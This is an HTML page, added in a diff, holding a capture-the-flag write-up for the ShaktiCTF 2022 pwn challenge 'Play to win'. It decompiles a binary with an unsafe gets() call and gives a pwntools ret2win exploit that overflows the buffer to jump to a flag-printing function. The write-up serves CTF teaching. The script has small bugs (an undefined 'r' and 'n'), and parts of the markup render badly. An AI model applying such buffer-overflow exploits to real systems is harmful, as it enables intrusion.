@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF22/pwn/play to win/writeup/">
+        <link rel="shortcut icon" href="../../../../img/favicon.ico">
+        <title>Shaktictf 22 writeups - CTF-Writeups</title>
+        <link href="../../../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+        <script src="../../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../../js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+
+        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+            <div class="container">
+
+                <!-- Collapsed navigation -->
+                <div class="navbar-header">
+                    <!-- Expander button -->
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
+                </div>
+
+                <!-- Expanded navigation -->
+                <div class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li >
+                                <a href="../../../../about/">About Us</a>
+                            </li>
+                            <li >
+                                <a href="../../../../shaktictf/">ShaktiCTF</a>
+                            </li>
+                            <li >
+                                <a href="https://team-shakti.github.io/">Website</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav navbar-right">
+                        <li>
+                            <a href="#" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF22/pwn/play to win/writeup.md">Edit on Team-Shakti/CTF-Write-ups</a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+                <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
+    <ul class="nav bs-sidenav">
+        <li class="main active"><a href="#shaktictf-22-writeups">Shaktictf 22 writeups</a></li>
+            <li><a href="#play-to-win">Play to win</a></li>
+    </ul>
+</div></div>
+                <div class="col-md-9" role="main">
+
+<h1 id="shaktictf-22-writeups">Shaktictf 22 writeups</h1>
+<h2 id="play-to-win">Play to win</h2>
+<p>DESCRIPTION:</p>
+<p>I was playing a game of adding words with my friends, until I added one too long!</p>
+<p>Note: The server is running on Ubuntu 20.04.</p>
+<p>FLAG FORMAT: shakti{}</p>
+<h3 id="intended-solution">Intended solution:</h3>
+<p>This is a basic ret2win challenge.</p>
+<p>A binary file is given as an attachment, where the usual checks give:</p>
+<p><img alt="" src="https://i.imgur.com/NqZOOmp.png" /></p>
+<p><img alt="" src="https://i.imgur.com/BVAl2Cl.png" /></p>
+<p>Running the file-</p>
+<p><img alt="" src="https://i.imgur.com/3gEnXL2.png" /></p>
+<p>Decompiling the game fuction in binary gives the following-</p>
+<pre><code>int game()
+{
+  int result; // eax
+  int v1; // eax
+  char v2[2]; // [rsp+8h] [rbp-18h] BYREF
+  char s[10]; // [rsp+Ah] [rbp-16h] BYREF
+  int v4; // [rsp+14h] [rbp-Ch]
+  int v5; // [rsp+18h] [rbp-8h]
+  int v6; // [rsp+1Ch] [rbp-4h]
+
+  puts(&quot;You think you can do this?&quot;);
+  result = puts(&quot;I don't think so.&quot;);
+  v5 = 0;
+  v4 = 0;
+  while ( v5 != 1 )
+  {
+    printf(&quot;Add the word:&quot;);
+    gets(s);        //gets function here!
+    v1 = strlen(s);
+    result = v1 + v4;
+    v4 = result;
+    if ( result == 10000 )
+    {
+      v5 = 1;
+      v6 = 1;
+      break;
+    }
+    puts(&quot;Do you want to continue?&quot;);
+    printf(&quot;Yes or No [y/n]:&quot;);
+    __isoc99_scanf(&quot;%s&quot;, v2);
+    getchar();
+    result = (unsigned __int8)v2[0];
+    if ( v2[0] == 121 || (result = (unsigned __int8)v2[0], v2[0] == 89) )
+    {
+      v5 = 0;
+    }
+    else
+    {
+      result = (unsigned __int8)v2[0];
+      if ( v2[0] == 110 || (result = (unsigned __int8)v2[0], v2[0] == 78) )
+        v5 = 1;
+      else
+        result = puts(&quot;Wrong input.&quot;);
+    }
+  }
+  if ( v6 == 1 )
+  {
+    winfunc();
+    exit(0);
+  }
+  return result;
+}
+</code></pre>
+
+<p>The basic objective of the game is to add words till the combined length of them all reaches 10000, upon which the game re-directs to a winfunc(), where it prints :
+ ```
+Ah well, you did win afterall.
+I guess congratlations are in order.</p>
+<pre><code> On opening the file in gdb and observing all the functions-
+
+![](https://i.imgur.com/hBilDaC.png)
+
+We see that there are two win fuctions here, winfunc and reallywin.And reallywin shows:
+</code></pre>
+
+<p>void __noreturn reallywin()
+{
+  puts("I may have underestimated you");
+  puts("You win!");
+  system("cat flag.txt");
+  exit(0);
+}</p>
+<pre><code>So basically you just have to redirect the control flow of the rip to reallywin. We have a gets fuction here, so we can overflow and overwrite rip.
+
+Now as stack is 16 bit aligned, it took 30 bytes of data to overwrite the buffer and we have to use the ret gadget to return back to the stack and overwrite rip with address of `reallywin`
+
+
+Exploit:
+
+```python
+from pwn import *
+elf = ELF(&quot;game&quot;)
+io=process(elf.path)
+ret = 0x40101a # Used to align stack
+
+win = elf.symbols['reallywin']
+
+#Fill the Buffer with 30 A's --&gt; overwrite return address with ret gadget to align the stack --&gt; then address of the reallywin function
+payload = b&quot;A&quot;*30 + p64(ret) + p64(win)
+r.sendline(payload)
+r.sendline(n) #to pass last check
+r.interactive()
+</code></pre>
+
+<p>This gives the flag:
+<code>shakti{G0od_joB_5olviNg_Thi5_1}</code></p></div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2020 <a href="http://Team-Shakti.github.io/">Team-Shakti Writeups</a></p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../../../..",
+                shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
+        </script>
+        <script src="../../../../js/base.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+        <script src="../../../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Search</h4>
+            </div>
+            <div class="modal-body">
+                <p>
+                    From here you can search these documents. Enter
+                    your search terms below.
+                </p>
+                <form role="form">
+                    <div class="form-group">
+                        <input type="text" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="Keyboard Shortcuts Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Keyboard Shortcuts</h4>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
